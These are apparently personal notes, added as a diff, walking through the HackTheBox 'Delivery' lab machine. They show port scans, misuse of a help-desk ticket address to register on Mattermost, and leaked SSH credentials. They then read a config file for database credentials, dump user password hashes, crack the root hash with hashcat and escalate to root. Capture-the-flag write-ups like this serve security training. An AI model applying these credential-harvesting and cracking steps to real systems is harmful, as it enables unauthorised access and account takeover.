@@ -1,0 +1,188 @@
+let's enumerate first.
+command: sudo rustscan -a 10.10.10.222
+result:
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+8065/tcp open  unknown syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,8065 10.10.10.222
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
+|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
+|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
+80/tcp   open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: delivery
+8065/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Accept-Ranges: bytes
+|     Cache-Control: no-cache, max-age=31556926, public
+|     Content-Length: 3108
+|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
+|     Content-Type: text/html; charset=utf-8
+|     Last-Modified: Sat, 24 Jun 2023 18:54:45 GMT
+|     X-Frame-Options: SAMEORIGIN
+|     X-Request-Id: ucpn8dkab3ddtxui1nedwpc5yc
+|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+|     Date: Sun, 25 Jun 2023 08:40:56 GMT
+|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Date: Sun, 25 Jun 2023 08:40:57 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8065-TCP:V=7.93%I=7%D=6/25%Time=6497FD98%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
+SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
+SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
+SF:rs\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConten
+SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Sat,\x2024\
+SF:x20Jun\x202023\x2018:54:45\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
+SF:X-Request-Id:\x20ucpn8dkab3ddtxui1nedwpc5yc\r\nX-Version-Id:\x205\.30\.
+SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Sun,\x
+SF:2025\x20Jun\x202023\x2008:40:56\x20GMT\r\n\r\n<!doctype\x20html><html\x
+SF:20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport
+SF:\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user
+SF:-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollo
+SF:w\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matter
+SF:most</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"
+SF:><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20
+SF:name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(H
+SF:TTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
+SF:0Sun,\x2025\x20Jun\x202023\x2008:40:57\x20GMT\r\nContent-Length:\x200\r
+SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
+SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
+SF:400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
+SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
+SF:\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
+SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:);
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   101.90 ms 10.10.16.1
+2   69.59 ms  helpdesk.delivery.htb (10.10.10.222)
+
+access: http://10.10.10.222/#contact-us
+click HelpDesk and MatterMost server
+
+put this 10.10.10.222 helpdesk.delivery.htb delivery.htb
+on /etc/hosts
+
+let's open new ticket choose contact us
+http://helpdesk.delivery.htb/open.php
+result:
+9039289@delivery.htb
+
+access: http://delivery.htb:8065/signup_email
+put email with: 9039289@delivery.htb
+username: oooxdf
+
+access: http://helpdesk.delivery.htb/view.php
+email address: 0xdf@0xdf.com
+ticker number: 9039289
+result:
+---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=i9s4j4mq3thgjd7zd39dfppc479t6s6gjsxi6zckjck8y5whdtcxkopobxdccppp&email=9039289%40delivery.htb ) --------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone, with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps
+
+access: http://delivery.htb:8065/do_verify_email?token=i9s4j4mq3thgjd7zd39dfppc479t6s6gjsxi6zckjck8y5whdtcxkopobxdccppp&email=9039289%40delivery.htb
+password: you registerd on
+choose internal:
+result:
+@developers Please update theme to the OSTicket before we go live.  
+Credentials to the server are maildeliverer:Youve_G0t_Mail!
+Also please create a program to help us stop re-using the same passwords everywhere....
+Especially those that are a variant of "PleaseSubscribe!"
+
+command: ssh maildeliverer@10.10.10.222
+password: Youve_G0t_Mail!
+
+command: cat user.txt 
+47077e11d1caa0de6283c5cec24af359
+
+command: cd /opt/mattermost/config
+command: cat config.json 
+result:
+"SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false
+    },
+
+command: mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost
+MariaDB [mattermost]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mattermost         |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [mattermost]> use mattermost
+Database changed
+MariaDB [mattermost]> show tables;
+
+MariaDB [mattermost]> select Username,Password from Users;
++----------------------------------+--------------------------------------------------------------+
+| Username                         | Password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| ooooxdf                          | $2a$10$dhVVCj3XRu6tbUYHSWpnjuy.Jb3nz7kG1BNbyNyHAjtXUUoD4Oli. |
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| oxdf                             | $2a$10$TM5Kbra0f8HCYB/Y4hA6fuAjI4jf/HTxWyUols/zwpYtHNHte54JC |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| oooxdf                           | $2a$10$MWpenrhuEjMqN7SR.QZtW.pj8OMOJjihFe6rSNvrXRaYBoyFyzdFa |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| ooxdf                            | $2a$10$jnJo4mit0wFxQtDZkwCrZeRboOUleSykFUlJFgUY/Kp1aKxzLS5Lm |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+
+put on hash
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+
+put on password:
+PleaseSubscribe!
+
+command: hashcat -m 3200 delivery_hash password --user -r /usr/share/hashcat/rules/best64.rule --show
+result:
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+
+command: su -
+password: PleaseSubscribe!21
+
+command: cat /root/root.txt
+2cf198903d6443925e53a0f0c4dc52b6
+
+resource:
+https://0xdf.gitlab.io/2021/05/22/htb-delivery.html
